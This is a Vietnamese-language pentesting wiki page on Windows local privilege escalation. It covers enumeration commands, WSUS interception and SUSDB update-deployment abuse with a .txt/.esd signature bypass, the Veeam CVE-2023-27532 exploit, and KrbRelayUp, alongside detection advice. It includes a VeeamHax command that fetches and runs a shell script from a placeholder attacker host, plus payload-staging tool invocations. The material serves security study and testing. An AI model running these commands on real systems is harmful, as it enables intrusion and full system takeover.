# Leo thang đặc quyền cục bộ trên Windows

{{#include ../../banners/hacktricks-training.md}}

### **Công cụ tốt nhất để tìm các vector leo thang đặc quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Trang này tổng hợp phương pháp luận chung về leo thang đặc quyền trên Windows từ một số hướng dẫn nền tảng.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Quy trình enumeration thực tế cũng tham khảo các workshop và checklist của cộng đồng.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nội dung về các cuộc tấn công trước đây bao gồm bài thuyết trình tại DerbyCon về leo thang đặc quyền trên Windows.<sup>[[5]](#references)</sup>

## Lý thuyết cơ bản về Windows

### Access Tokens

**Nếu bạn chưa biết access token của Windows là gì, hãy đọc trang sau trước khi tiếp tục:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**Xem trang sau để biết thêm thông tin về ACL - DACL/SACL/ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Nếu bạn chưa biết integrity level trong Windows là gì, hãy đọc trang sau trước khi tiếp tục:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Các biện pháp kiểm soát bảo mật của Windows

Windows có nhiều cơ chế có thể **ngăn bạn enumeration hệ thống**, chạy executable hoặc thậm chí **phát hiện hoạt động của bạn**. Trước khi bắt đầu enumeration để leo thang đặc quyền, bạn nên **đọc** **trang** sau và **enumeration** tất cả các **cơ chế phòng thủ** này:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Quyền truy cập vật lý cũng có thể biến việc chỉnh sửa UEFI NVRAM khi hệ thống offline thành một chuỗi tấn công DMA trước khi khởi động và vá bộ nhớ Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Bỏ qua Admin Protection / nâng quyền im lặng bằng UIAccess

Có thể lạm dụng các tiến trình UIAccess được khởi chạy qua `RAiLaunchAdminProcess` để đạt High IL mà không hiện lời nhắc, khi các bước kiểm tra secure-path của AppInfo bị bỏ qua. Xem quy trình chuyên biệt để bypass UIAccess/Admin Protection tại đây:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Có thể lạm dụng việc truyền tiếp registry của Secure Desktop accessibility để ghi tùy ý vào registry bằng quyền SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Các bản Windows gần đây cũng có một con đường LPE qua **SMB arbitrary-port**, trong đó một xác thực NTLM cục bộ có đặc quyền được phản chiếu qua kết nối TCP SMB được tái sử dụng:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Thông tin hệ thống

### Enumeration thông tin phiên bản

Kiểm tra xem phiên bản Windows có lỗ hổng đã biết nào không (đồng thời kiểm tra các bản vá đã được áp dụng).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Khai thác theo phiên bản

[Trang này](https://msrc.microsoft.com/update-guide/vulnerability) hữu ích để tra cứu thông tin chi tiết về các lỗ hổng bảo mật của Microsoft. Cơ sở dữ liệu này có hơn 4.700 lỗ hổng bảo mật, cho thấy **bề mặt tấn công khổng lồ** mà một môi trường Windows tạo ra.

**Trên hệ thống**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tích hợp watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — kiểm kê bản build của OS, các bản cập nhật đã cài đặt và những ứng viên advisory được chọn; hãy xác minh chính xác sản phẩm và các bản cập nhật thay thế trước khi xem kết quả là phù hợp.

Đối với local exploit dành riêng cho một phiên bản, hãy kiểm tra **kiến trúc của tiến trình đang chạy** bên cạnh kiến trúc OS. Trên Windows 64-bit, tiến trình 32-bit chịu ảnh hưởng của [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` thường trỏ đến thư mục hệ thống 32-bit, còn `%windir%\Sysnative` cho phép tiến trình đó truy cập thư mục hệ thống native. Alias này không khả dụng với tiến trình 64-bit. Bản build OS hoặc ứng viên thiếu KB không chứng minh rằng hệ thống có thể bị khai thác; hãy đối chiếu bản build đang chạy, bản cập nhật đã cài đặt hoặc bản cập nhật thay thế, kiến trúc tiến trình và các điều kiện tiên quyết của exploit với [bản tin bảo mật của Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dành cho vấn đề cụ thể.

Để xem ví dụ về lỗi ghi đè bộ nhớ trong service, tham khảo [các offset ring trong shared memory MIDI do client kiểm soát](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Các stack offset đã công bố chỉ áp dụng cho bản build được kiểm thử; đạt được `LOCAL SERVICE` khác với bước tiếp theo là [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) để lên `SYSTEM`.<sup>[[44]](#references)</sup>

**Cục bộ, sử dụng thông tin hệ thống**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Các repo GitHub chứa exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Môi trường

Có credential/thông tin Juicy nào được lưu trong các biến môi trường không?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Lịch sử PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Các tệp bản ghi PowerShell

Bạn có thể tìm hiểu cách bật tính năng này tại [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` chỉ là ví dụ. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) thường ghi dữ liệu vào thư mục Documents của từng người dùng, nhưng cài đặt `OutputDirectory` hoặc `Start-Transcript -OutputDirectory` có thể chuyển hướng tệp đến một thư mục dùng chung hoặc ẩn. Hãy kiểm tra đường dẫn đầu ra thực tế và ACL của tệp trước khi xem transcript: tệp có thể chứa các đối số lệnh và đầu ra, bao gồm cả thông tin xác thực. Transcript đọc được chỉ là manh mối khi nội dung tiết lộ danh tính có quyền cao hơn có thể sử dụng được, đồng thời danh tính đó có thể đăng nhập trong ngữ cảnh liên quan.

### PowerShell Module Logging

Thông tin chi tiết về các lần thực thi pipeline của PowerShell được ghi lại, bao gồm các lệnh đã thực thi, các lần gọi lệnh và một phần nội dung script. Tuy nhiên, có thể không ghi lại đầy đủ chi tiết thực thi và kết quả đầu ra.

Để bật tính năng này, hãy làm theo hướng dẫn trong phần "Transcript files" của tài liệu và chọn **"Module Logging"** thay vì **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Để xem 15 sự kiện gần nhất từ nhật ký PowersShell, bạn có thể thực thi:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ghi lại đầy đủ hoạt động và toàn bộ nội dung khi script thực thi, đảm bảo mọi khối mã đều được ghi nhận trong lúc chạy. Quy trình này lưu giữ dấu vết kiểm tra toàn diện của từng hoạt động, hữu ích cho việc điều tra pháp chứng và phân tích hành vi độc hại. Việc ghi lại mọi hoạt động ngay tại thời điểm thực thi giúp cung cấp thông tin chi tiết về quy trình.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Các sự kiện ghi nhật ký cho Script Block có thể được tìm thấy trong Trình xem sự kiện Windows theo đường dẫn: **Nhật ký ứng dụng và dịch vụ > Microsoft > Windows > PowerShell > Hoạt động**.\
Để xem 20 sự kiện gần nhất, bạn có thể dùng:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Cài đặt Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Ổ đĩa

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Hướng dẫn trước đây tóm tắt rủi ro như sau:

Bạn có thể xâm nhập hệ thống nếu các bản cập nhật được yêu cầu qua http thay vì http**S**.

Endpoint WSUS dùng HTTP là dấu hiệu cần kiểm tra khả năng can thiệp vào metadata cập nhật. Khả năng khai thác còn phụ thuộc vào việc client có sử dụng máy chủ WSUS đó hay không, kẻ tấn công có thể chặn hoặc kiểm soát lưu lượng của máy chủ hay không, cũng như chính sách cài đặt và độ tin cậy cập nhật của client. Chỉ riêng URL không chứng minh được khả năng thực thi mã. [Microsoft khuyến nghị dùng TLS cho metadata WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Trước tiên, hãy kiểm tra xem mạng có sử dụng bản cập nhật WSUS không dùng SSL hay không bằng cách chạy lệnh sau trong cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Hoặc dùng lệnh sau trong PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Nếu bạn nhận được phản hồi như một trong những phản hồi sau:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Và nếu `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` hoặc `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` bằng `1`.

Phát biểu ban đầu về khả năng áp dụng là:

Khi đó, **có thể khai thác được.** Nếu giá trị registry cuối cùng bằng 0 thì mục WSUS sẽ bị bỏ qua.

Khi `UseWUServer` là `1`, Windows Update sử dụng dịch vụ intranet đã cấu hình. Điều này xác nhận một điều kiện tiên quyết cho phương thức interception HTTP, nhưng không chứng minh rằng có thể interception, chấp nhận bản cập nhật độc hại hoặc cài đặt với quyền cao. Khi giá trị này là `0`, chính sách đó không chọn endpoint WSUS đã cấu hình này.

Để khai thác các lỗ hổng này, bạn có thể dùng các công cụ như: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Đây là các script khai thác MiTM được vũ khí hóa để chèn bản cập nhật 'giả' vào lưu lượng WSUS không dùng SSL.

Đọc nghiên cứu tại đây:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Đọc báo cáo đầy đủ tại đây**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Về cơ bản, đây là lỗ hổng mà lỗi này khai thác:

> Nếu có quyền sửa proxy của người dùng cục bộ và Windows Updates sử dụng proxy được cấu hình trong cài đặt Internet Explorer, thì chúng ta có thể chạy [PyWSUS](https://github.com/GoSecure/pywsus) cục bộ để interception lưu lượng của chính mình và chạy code với quyền cao trên máy.
>
> Hơn nữa, vì dịch vụ WSUS sử dụng cài đặt của người dùng hiện tại nên dịch vụ này cũng sử dụng kho chứng chỉ của người dùng đó. Nếu tạo chứng chỉ tự ký cho hostname WSUS và thêm chứng chỉ này vào kho chứng chỉ của người dùng hiện tại, chúng ta có thể interception cả lưu lượng WSUS qua HTTP lẫn HTTPS. WSUS không sử dụng cơ chế kiểu HSTS để triển khai xác thực kiểu trust-on-first-use cho chứng chỉ. Nếu chứng chỉ được trình bày được người dùng tin cậy và có hostname chính xác, dịch vụ sẽ chấp nhận chứng chỉ đó.

Bạn có thể khai thác lỗ hổng này bằng công cụ [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (khi công cụ này được phát hành).

### Bản cập nhật do quản trị viên WSUS kiểm soát

Một phương thức riêng biệt có thể áp dụng khi danh tính hiện tại có thể **phát hành và phê duyệt** bản cập nhật trên máy chủ WSUS. Kiểm tra tư cách thành viên thực tế trong nhóm `WSUS Administrators` của máy chủ và mọi quyền WSUS được ủy quyền, sau đó xác định nhóm máy tính client sẽ nhận bản cập nhật đã phê duyệt. [Microsoft yêu cầu quyền WSUS Administrator để phê duyệt bản cập nhật](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), đồng thời [tài liệu hóa mối quan hệ tin cậy khi phát hành](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): client phải tin cậy chứng chỉ ký được dùng cho nội dung phát hành cục bộ. Hãy xác nhận bản cập nhật tiềm năng đã được ký và chấp nhận, áp dụng cho mục tiêu, đồng thời được cài đặt trong ngữ cảnh có quyền cao hơn trước khi xem đây là một con đường leo thang đặc quyền. Chỉ riêng giá trị HTTP `WUServer` hoặc tên nhóm không đủ để xác lập các điều kiện đó.

### Lạm dụng bản cập nhật tùy chỉnh SUSDB: payload không ký qua `.txt`/`.esd`

Đây là lỗi ranh giới tin cậy khác với việc interception kết nối WSUS qua HTTP: điều kiện tiên quyết là có đủ quyền truy cập vào **các stored procedure của cơ sở dữ liệu WSUS (`SUSDB`)** để phát hành và phê duyệt bản cập nhật tùy chỉnh. Một cách tiếp cận thực tế là relay tài khoản máy tính WSUS upstream tới một máy chủ MSSQL riêng lưu trữ `SUSDB`; điều kiện tiên quyết cụ thể tùy thuộc vào cách triển khai, vì vậy trước tiên hãy liệt kê các quyền `EXECUTE` thay vì mặc định rằng cần quyền quản trị SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Đối với phương thức tấn công riêng relay xác thực của WSUS client từ HTTP/8530 tới LDAP, SMB hoặc AD CS, xem [Lạm dụng WSUS HTTP để relay NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Xác nhận relay tới cơ sở dữ liệu bên ngoài và quyền thực thi procedure

Trong các môi trường triển khai WSUS sử dụng SQL Server bên ngoài, trước tiên hãy kiểm tra xem tài khoản máy chủ WSUS có thể xác thực với cơ sở dữ liệu hay không và NTLM relay có đến được listener đó hay không. Vai trò SQL của máy chủ có thể cấp quyền truy cập các procedure phát hành bản cập nhật ngay cả khi quyền ghi trực tiếp vào bảng bị từ chối; việc `UPDATE` thất bại trên `SUSDB` không chứng minh rằng chức năng phát hành bị chặn. Hãy kiểm tra danh tính thực tế, tư cách thành viên vai trò và quyền đối với procedure trong một phiên SQL được ủy quyền trước khi thử phát hành bản cập nhật tùy chỉnh.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Các định nghĩa thủ tục đang hoạt động và tệp `SoftwareDistributionPackage.xsd` đã cài đặt rất hữu ích khi tái dựng metadata cập nhật hợp lệ. Cả bundle parent lẫn payload child đều cần `UpdateIdentity` (loại fragment `1`), `LocalizedProperties` (`4`) và `ExtendedProperties` (`2`); hãy ghi lại local revision ID được trả về từ mỗi lần gọi `spImportUpdate` và đảm bảo mối quan hệ bundle, digest, kích thước, content URL và revision luôn nhất quán. Đây là quy trình publishing có trạng thái, vì vậy một lần gọi stored procedure thành công không chứng minh rằng quá trình thực thi phía client đã diễn ra.<sup>[[38]](#references)</sup>

#### Tạo, nhắm mục tiêu và phê duyệt bản cập nhật

Quy trình custom-update sử dụng các thủ tục WSUS hợp lệ làm API publishing bị giới hạn. Các chuyển đổi trạng thái quan trọng gồm:<sup>[[38]](#references)</sup>

| Giai đoạn | Stored procedure liên quan |
| --- | --- |
| Import metadata của bản cập nhật | `spImportUpdate` |
| Lưu các XML fragment prerequisite, localized và extended | `spSaveXMLFragment` |
| Liên kết digest của content với URL do attacker kiểm soát | `spSetBatchURL` |
| Liệt kê/tạo computer group và thêm client vào nhóm | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Phê duyệt cài đặt cho nhóm đó | `spDeployUpdate` với `@actionID = 0` và `@isAssigned = 1` |

Tên tệp, digest, kích thước và handler `CommandLineInstallation` phải khớp nhau trong metadata/fragments đã import. Sau khi gán content URL và target group, bước phê duyệt cuối cùng có dạng như sau; hãy dùng các identifier mới cho update, group và deployment thay vì phát lại các GUID ví dụ.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass chữ ký dựa trên phần mở rộng

WSUS thường từ chối nội dung thực thi tùy ý chưa được ký. Tuy nhiên, trong `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, đường dẫn .NET `VerifyFile` đặt cờ kiểm tra chứng chỉ thành false khi tên tệp được cung cấp kết thúc bằng `.txt` hoặc `.esd`; khi đó `CheckCertificateSignature` bị bỏ qua mà không xác minh trước rằng các byte đó là văn bản hoặc ảnh ESD hợp lệ. Do đó, một PE không thay đổi, chẳng hạn được đặt tên là `payload.exe.txt`, có thể vượt qua bước xác minh nội dung rồi được trình xử lý cài đặt dòng lệnh của bản cập nhật khởi chạy. Đây là lỗi nhầm lẫn chính sách/kiểu dữ liệu, không phải giả mạo chữ ký.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging và tự động hóa tương thích với BITS

Gọi `spDeployUpdate` sẽ khiến WSUS tải nội dung đã đăng ký. Máy chủ nguồn phải đáp ứng các yêu cầu HTTP của BITS: chỉ có URL truy cập được là chưa đủ vì quá trình truyền sử dụng luồng `HEAD`/`GET` ban đầu cùng các yêu cầu byte-range. Máy chủ không hỗ trợ Range sẽ tạo ra sự kiện đồng bộ WSUS `EventId=364`, cho biết BITS yêu cầu header giao thức Range.<sup>[[39]](#references)</sup>

PoC nghiên cứu [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) tạo SQL cần thiết cho chuỗi import/fragment/URL/group/deployment, đi kèm một MSSQL client đã chỉnh sửa để thực thi SQL đó, đồng thời cung cấp `BitsWebServer.py` để staging nội dung. Cách gọi tối thiểu trong lab được cấp phép là:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Thực thi không cần giám sát và persistence qua cơ chế thử lại

Tương tác phía client phụ thuộc vào policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, tùy chọn `4 - Auto download and schedule install`, sẽ tải xuống và cài đặt một update đã được phê duyệt theo lịch đã cấu hình mà không cần người dùng chọn thủ công. Trong quá trình kiểm thử, payload có trạng thái update vẫn failed/incomplete được đề xuất lại ngay sau khi process callback thoát, vì vậy hành vi retry có thể trở thành persistence thông qua thực thi lặp lại; cách này dễ gây chú ý vì client hiển thị trạng thái update-failed.<sup>[[39]](#references)</sup>

#### Các hướng pivot để phát hiện và hardening

Các hướng pivot hữu ích phía server và client trong chuỗi này là:<sup>[[39]](#references)</sup>

- Audit việc thực thi `spCreateTargetGroup`, `spSetBatchURL` và `spDeployUpdate` trên `SUSDB`; điều tra các targeting group mới, nguồn nội dung bên ngoài, payload update `.txt`/`.esd` và các deployment do principal bất ngờ thực hiện (đặc biệt là tài khoản không phải máy tính).
- Kiểm tra `C:\Program Files\Update Services\LogFiles` để tìm `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (viết sai chính tả) và `EventId=364`; đối chiếu quá trình xác minh với phần mở rộng payload và magic của nội dung thay vì tin vào hậu tố.
- Tìm các trường hợp cài đặt Windows Update liên tục thất bại/thử lại, cũng như việc thực thi PE hoặc hoạt động mạng/process con bất ngờ từ nội dung mang tên `.txt` hoặc `.esd`.
- Bắt buộc sử dụng Extended Protection for Authentication trên dịch vụ database nếu được hỗ trợ, đồng thời giới hạn quyền truy cập mạng database cho máy chủ WSUS và các hệ thống quản trị được ủy quyền. Hạn chế tối đa và audit quyền `EXECUTE` trên các stored procedure custom-update.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Nhiều agent doanh nghiệp cung cấp một bề mặt IPC trên localhost và một kênh update có đặc quyền. Nếu có thể ép quá trình enrollment kết nối tới server của attacker và updater tin cậy một root CA giả mạo hoặc kiểm tra signer yếu, người dùng cục bộ có thể chuyển một MSI độc hại để dịch vụ SYSTEM cài đặt. Xem kỹ thuật tổng quát hóa (dựa trên chuỗi Netskope stAgentSvc – CVE-2025-0309) tại đây:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM qua TCP 9401)

Mô tả ban đầu theo phiên bản cụ thể và ghi chú trinh sát là:

Veeam B&R < `11.0.1.1261` để lộ một service localhost trên **TCP/9401**, xử lý các message do attacker kiểm soát, cho phép thực thi lệnh tùy ý dưới quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: xác nhận listener và phiên bản, ví dụ: `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication và Cloud Connect sử dụng một core backup service trên **TCP/9401 theo mặc định**. [Thông báo bảo mật của Veeam](https://www.veeam.com/kb4424) mô tả việc tiết lộ trái phép thông tin xác thực database cấu hình đã mã hóa trong phạm vi mạng backup; một PoC công khai riêng biệt cho thấy một đường dẫn thực thi lệnh dưới quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service có thể bind vào địa chỉ không chỉ giới hạn ở localhost, vì vậy hãy kiểm tra địa chỉ và PID thực tế.

- **Recon**: xác nhận TCP/9401 thuộc về `Veeam.Backup.Service.exe`, sau đó kiểm tra sản phẩm đã cài đặt và metadata bản vá. `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` là manh mối, không phải bước kiểm tra bản vá đầy đủ.
- **Các mốc phiên bản đã sửa lỗi**: Veeam liệt kê **11a build 11.0.1.1261 P20230227** và **12 build 12.0.0.1420 P20230223** là các bản phát hành đầu tiên đã sửa lỗi; các bản phát hành trước đó bị ảnh hưởng. Chỉ dựa vào file version gồm bốn phần thì không thể phân biệt một base build chưa được vá với một bản vá mới hơn trên cùng build number. Hãy xác minh patch identifier theo [lịch sử build của nhà cung cấp](https://www.veeam.com/kb2680) trước khi xác định một boundary build đã được sửa lỗi.
- **Exploit**: đặt một PoC như `VeeamHax.exe` cùng các Veeam DLL cần thiết trong cùng thư mục, sau đó kích hoạt payload SYSTEM qua local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Dịch vụ thực thi lệnh với quyền SYSTEM.

PoC được trích dẫn minh họa việc thực thi lệnh với quyền SYSTEM khi đáp ứng các điều kiện tiên quyết bổ sung; thông báo tư vấn của nhà cung cấp mô tả vấn đề làm lộ thông tin xác thực.

## KrbRelayUp

Mô tả ban đầu về môi trường mặc định là:

Lỗ hổng **leo thang đặc quyền cục bộ** tồn tại trong các môi trường **domain** Windows trong những điều kiện cụ thể. Các điều kiện này bao gồm môi trường không **bắt buộc ký LDAP**, người dùng có quyền tự thiết lập **Resource-Based Constrained Delegation (RBCD)** và người dùng có khả năng tạo máy tính trong domain. Lưu ý rằng các **yêu cầu** này được đáp ứng bằng **cài đặt mặc định**.

Một cuộc relay Kerberos cục bộ có thể chuyển từ phiên đăng nhập với đặc quyền thấp sang thao tác ghi thư mục có đặc quyền cao khi một COM server phù hợp xác thực và principal bị relay có quyền trên đối tượng mục tiêu. [Tài liệu KrbRelay](https://github.com/cube0x0/KrbRelay) mô tả cả thao tác ghi LDAP RBCD và `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp tự động hóa một số đường tấn công này. Chuỗi tấn công RBCD yêu cầu có quyền delegation và quyền trên đối tượng mục tiêu phù hợp, còn chuỗi shadow-credential yêu cầu quyền ghi key-credential và KDC hỗ trợ đường xác thực bằng chứng chỉ. Không đường tấn công nào trong số này tự động khả thi chỉ vì người dùng là thành viên domain.

Kiểm tra chính sách [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) và [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) thực tế của DC, ACL đối tượng của danh tính bị relay, cũng như các mức xác thực và mạo danh của lớp COM được chọn. Loại đăng nhập và ngữ cảnh thông tin xác thực của người gọi cũng quan trọng: phiên WinRM có thể hoạt động khác với phiên đăng nhập tương tác hoặc đăng nhập bằng thông tin xác thực mới. Định tuyến firewall/OXID và các bản cập nhật đã cài đặt cũng có thể làm thay đổi kết quả. Hãy xem chính sách cho phép hoặc ACL phù hợp là đối tượng cần rà soát; việc liệt kê thụ động không nên kích hoạt COM coercion, xác thực relay hoặc thao tác ghi thư mục. Shadow credential của tài khoản máy có thể dẫn đến machine ticket và chỉ khi tài khoản đó có các quyền replication thư mục cần thiết thì mới có thể dẫn đến một đường DCSync riêng.

Tìm **exploit tại** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Để biết thêm thông tin về luồng tấn công, hãy xem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

